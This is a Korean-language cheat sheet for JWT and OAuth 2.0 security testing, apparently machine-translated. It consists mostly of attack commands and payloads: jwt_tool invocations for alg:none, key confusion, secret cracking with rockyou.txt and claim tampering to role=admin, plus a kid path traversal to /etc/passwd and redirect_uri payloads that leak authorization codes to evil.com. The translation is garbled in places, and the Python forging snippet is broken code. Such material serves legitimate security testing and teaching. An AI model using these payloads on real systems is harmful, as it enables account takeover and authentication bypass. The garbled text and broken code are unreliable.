# JWT + OAuth 2.0 보안 테스트

## JWT 공격 표면

### 1. 알고리즘 난독화

```bash
# alg:none — 가장 고전적인
# 원본: {"alg":"RS256","typ":"JWT"}.payload.signature
# 공격: {"alg":"none","typ":"JWT"}.payload. (빈 서명)

# RS256 → HS256 키 난독화
# 서버가 HS256 확인을 위해 RS256 공개 키를 사용하는 경우
# 공개 키를 HMAC 키로 사용하여 서명할 수 있습니다.
python3 jwt_tool.py <JWT> -X k -pk public.pem

# 아이가 주사를 놓다
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# 서버는 kid가 가리키는 파일의 내용을 HMAC 키로 사용합니다.
```

### 2. jwt_tool 전체 사용

```bash
# 전체 스캔
python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"

# 약한 키 발파
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# 변조 진술서
python3 jwt_tool.py <JWT> -I -pc role -pv admin
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999

# RSA 키 난독화
python3 jwt_tool.py <JWT> -X k -pk public.pem

# JWK 삽입
python3 jwt_tool.py <JWT> -X i
```

### 3. 수동 JWT 변조

```python
import jwt
import base64

# 디코드(확인하지 않음)
header, payload, sig = jwt.split('.')

# 페이로드 조작
payload['role'] = 'admin'
payload['exp'] = 9999999999

# alg:none
new_token = base64url_encode(header) + '.' + base64url_encode(payload) + '.'

# HS256 with known key
new_token = jwt.encode(payload, 'secret', algorithm='HS256')
```

## OAuth 2.0 공격 표면

### 인증 코드 부여

```text
1.redirect_uri 제어
일반: https://app.com/callback?code=AUTH_CODE
   공격: https://app.com/callback@evil.com?code=AUTH_CODE
         https://evil.com/?redirect=https://app.com/callback?code=AUTH_CODE
         리디렉션 열기 + 리디렉션_uri: https://app.com/callback?redirect=https://evil.com

2. 상태를 통한 CSRF가 누락되었습니다.
   상태 매개변수 없음 → 공격자는 피해자 세션을 자신의 코드로 바인딩합니다.

3. PKCE 누락
   No code_challenge → 인증코드 가로채기 공격

4. 리퍼러에서 토큰 유출
   콜백 페이지는 외부 리소스를 로드합니다. → Referer 헤더에는 code/token이 포함됩니다.
```

### 암시적 부여(더 이상 사용되지 않지만 여전히 배포됨)

```text
1. URL 조각에서 access_token 누출 → 참조자
2. 브라우저 기록 내 토큰 → 물리적 접근 위험
3. 클라이언트 인증 없음 → 토큰 교체 공격
```

### 클라이언트 자격 증명 부여

```text
1. client_secret 유출(프론트엔드/모바일 하드코딩)
2. 과도한 범위 부여
3. 클라이언트 속도 제한 없음 → 무차별 열거
```

### 일반 OAuth 테스트

```text
□ 테스트 범위 개선: 범위=읽기 → 범위=읽기%20쓰기
□ 토큰 재생: 기존 access_token을 사용하여 새 리소스에 액세스
□ Refresh 토큰 남용: Refresh_token 무기한 갱신
□ 교차 테넌트 액세스: 테넌트 A의 토큰 액세스 테넌트 B
□ 로그/URL/Referer에서 토큰 유출
```

## 도구

```bash
 # JWT 테스트
pip install jwt-tool pyjwt

 # OAuth 테스트
# Burp Suite + OAuth 스캐너 확장
# Postman OAuth 2.0 프로세스 테스트

# 자동화
# 엔트로피: 자동 JWT 변조 + OAuth 리디렉션_uri 테스트
```

Source: OWASP API 상위 10개(API2: 손상된 인증), jwt_tool, PortSwigger OAuth 연구
